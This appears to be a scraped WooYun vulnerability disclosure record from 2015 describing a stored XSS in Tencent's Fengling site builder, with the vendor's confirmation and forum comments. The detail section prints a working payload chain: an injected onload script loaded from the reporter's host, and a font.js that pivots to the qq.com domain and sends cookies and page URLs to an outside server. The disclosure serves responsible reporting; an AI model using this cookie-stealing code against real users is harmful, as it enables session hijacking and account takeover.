{"id": 73989, "wybug_id": "wooyun-2015-0164769", "wybug_title": "腾讯某站XSS漏洞可获取cookie/skey（点击一下上你的各种qq业务）", "wybug_corp": "腾讯", "wybug_author": "thx", "wybug_date": "2015-12-28 13:23", "wybug_open_date": "2016-02-09 23:29", "wybug_type": "XSS 跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "6", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-09：\t细节向公众公开  简要描述： ~ 详细说明：  风铃建站，桌面版预览，没有过滤QQ客服组件自上传图片url，效果页面：http://qz6666.com/iframe.htmlhttp://preview.flzhan.com/default/preview?mode=pc&siteId=2000685651&url=http%3A%2F%2Fpreview.flzhan.com%2Fpreview%2Fpreview%2F2000685651%2Findex.html%3Fmode%3Dpc\n\n1.风铃建站，选择桌面模板创建网站http://zhan.qq.com/default/tpl?screen=1&type=12.编辑，组件，添加QQ客服，组件设置中自己上传图片并在保存时抓包，更改srchttp://fl.cdn.qq.com/transition/51/2000685651/982/82044509425637198825458012571080.png#\\\" onload=\\\"var s=document.createElement('script');s.src='http://qz6666.com/font.js';document.body.appendChild(s);3.预览，会跳转到带有token的url，token会失效，XSS获取的cookie也是flzhan.com域的http://preview.flzhan.com/preview/preview/2000685651/index.html?mode=pc&time=1451042318&tk=555d0e28df242f8eb34d757254028a49&r=596752解决token问题，抓包发现是由一个无token的url跳转的:http://preview.flzhan.com/default/preview?mode=pc&siteId=2000685651&url=http%3A%2F%2Fpreview.flzhan.com%2Fpreview%2Fpreview%2F2000685651%2Findex.html%3Fmode%3Dpc解决cookie域问题，从下面文件中看到开头一句话，尝试直接替换url中的域名\nhttp://api.zhan.qq.com/default/initJs?siteId=2000685651&page=index&target=preview&v=96196//若站点域名使用xxx.zhan.qq.com，则设置docunent.domainvar topUrl = window.location.href;if(topUrl.indexOf('zhan.qq.com')>0){    document.domain = 'qq.com';}\n发现有效http://zhan.qq.com/preview/preview/2000685651/index.html?mode=pc&time=1451042318&tk=555d0e28df242f8eb34d757254028a49&r=5967524.最终思路，预览无token的url，跳转到带token的url，加载xss脚本，获取token，框架加载替换域名url，获取qq.com域cookie\nfont.jsvar domain = document.domain;//第一次加载domain为preview.flzhan.com，第二次加载domain为qq.comif (domain == 'preview.flzhan.com'){\tvar pre_token = GetCookie('previewTk_2000685651');\tvar pre_time = GetCookie('previewTime_2000685651');\tvar s = document.createElement('iframe');s.src=\"http://zhan.qq.com/preview/preview/2000685651/index.html?mode=pc&time=\"+pre_time+\"&tk=\"+pre_token+\"&r=\"+Math.random()*1000000;s.style.display='none';document.body.appendChild(s);}﻿﻿else if (domain == \"qq.com\"){\tWriteLog();}function GetCookie(name) {\tvar arr = document.cookie.match(new RegExp(\"(^| )\" + name + \"=([^;]*)(;|$)\"));\tif (arr != null) return unescape(arr[2]);\treturn null;}//没搭XSS平台，下面是xsser.me中直接借的一段代码function WriteLog(){(new Image()).src='http://qz6666.com/font.asp?do=api&id=u5AqAS&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());}\n最后，又有一个问题，页面有判断referrer，必须是*.qq.com或者空，不能隐藏框架形式加载。解决，GG了一个匿名FTP，ftp跨协议：ftp://218.2.110.212/Webs/Mod_EnvAuto/CommonInfo/bulletininfo/test.html\ntest.html<script>window.location=\"http://preview.flzhan.com/default/preview?mode=pc&siteId=2000685651&url=http%3A%2F%2Fpreview.flzhan.com%2Fpreview%2Fpreview%2F2000685651%2Findex.html%3Fmode%3Dpc\";</script>\n最终效果：http://qz6666.com/iframe.html   漏洞证明：  http://preview.flzhan.com/default/preview?mode=pc&siteId=2000685651&url=http%3A%2F%2Fpreview.flzhan.com%2Fpreview%2Fpreview%2F2000685651%2Findex.html%3Fmode%3Dpc\n\nhttp://qz6666.com/iframe.html\n\nhttp://qz6666.com/cook.txt\n\n   修复方案：     版权声明：转载请注明来源 thx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-12-29 14:23 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-12-29 14:25 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:1656 漏洞数:246        | WooYun is the Bigest gay place.  网络工...)\t\t \n  6666 可以上LOL吗。    \n     2015-12-29 14:31 |    \t\tking7 \t\t\t( 普通白帽子  |\t\t\t        Rank:1617 漏洞数:231        | 乱花渐欲迷人眼)\t\t \n  @_Thorns 表哥的这个叼~~    \n     2015-12-29 14:33 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1218 漏洞数:323        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  6666 可以上LOL吗。    \n     2015-12-29 14:36 |    \t\t田老板 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:4        | 学校杀手)\t\t \n  6666 可以上LOL吗。    \n     2015-12-29 14:44 |    \t\tchinakid \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:12        )\t\t \n  不就是群问问的图片投票 貌似修复了吧 呵呵哒 ~！~    \n     2015-12-29 14:51 |    \t\t随风的风 \t\t\t( 普通白帽子  |\t\t\t        Rank:201 漏洞数:69        | 微信公众号：233sec  不定期分享各种漏洞思...)\t\t \n  6666 可以上LOL吗。    \n     2015-12-29 15:17 |    \t\tBlcat \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:20        | 家穷人丑 一米四九 小学文化 农村户口)\t\t \n  我想点一下    \n     2015-12-29 15:40 |    \t\t法官 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | Seven)\t\t \n  给我开满钻阿    \n     2015-12-29 16:13 |    \t\tJumbo \t\t\t( 普通白帽子  |\t\t\t        Rank:115 漏洞数:30        | 猫 - http://www.chinabaiker.com)\t\t \n  6666 可以上LOL吗。    \n     2015-12-29 16:54 |    \t\tHex \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:13        | 又一天过去了，今天过得怎么样，梦想是不是...)\t\t \n  不点不点就不点    \n     2015-12-29 17:49 |    \t\tCan \t\t\t( 实习白帽子  |\t\t\t        Rank:66 漏洞数:22        | 我个人认为Windows环境下明小子最好用！)\t\t \n  6666 可以上LOL吗。    \n     2015-12-29 17:50 |    \t\tSubmit \t\t\t( 普通白帽子  |\t\t\t        Rank:526 漏洞数:118        | 我在乌云等你哟)\t\t \n  表锅    \n     2015-12-29 17:57 |    \t\toneplusone \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:15        | 三十功名尘与土，八千里路云和月。莫等闲、...)\t\t \n  表锅     \n     2015-12-29 19:30 |    \t\t骸骸 \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:7        )\t\t \n  表锅    \n     2015-12-29 19:37 |    \t\t冷白开。 \t\t\t( 普通白帽子  |\t\t\t        Rank:198 漏洞数:81        | QQ:970060225 大二屌丝狗求职~谢绝黑产！欢...)\t\t \n  表锅~大腿~    \n     2015-12-29 19:59 |    \t\t终于明白 \t\t\t( 普通白帽子  |\t\t\t        Rank:103 漏洞数:24        | 彩笔一枚。。。)\t\t \n  可以上lol么    \n     2015-12-29 23:56 |    \t\t书生 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:6        )\t\t \n  http://www.af-qq.top/ 谁的自己认领吧，能不能别特么再发邮件了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}